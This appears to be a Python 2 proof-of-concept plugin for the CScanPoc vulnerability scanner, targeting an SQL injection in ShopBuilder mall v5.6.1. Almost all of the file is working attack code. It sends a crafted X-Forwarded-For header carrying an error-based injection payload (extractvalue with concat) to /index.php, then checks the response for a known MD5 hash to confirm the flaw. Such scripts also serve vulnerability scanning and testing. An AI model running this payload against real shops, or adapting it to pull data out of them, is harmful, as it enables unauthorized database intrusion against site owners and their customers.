# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'ShopBuilder_0000' # 平台漏洞编号，留空
    name = 'ShopBuilder商城 v5.6.1 sql注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-12-28'  # 漏洞公布时间
    desc = '''
        ShopBuilder商城 v5.6.1 sql注入
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=067088' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'ShopBuilder'  # 漏洞应用名称
    product_version = '5.6.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f79d42cc-3030-494c-b79a-b69965038660'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "X-Forwarded-For:127.0.0.1' and extractvalue(1,concat(0x3a,md5(3.14),0x3a)) and '1"
            url = arg + '/index.php'
            code, head, res, errcode,finalurl = hh.http('"-H %s %s"' % (payload,url))
                       
            if code == 200 and '4beed3b9c4a886067de0e3a094246f7' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()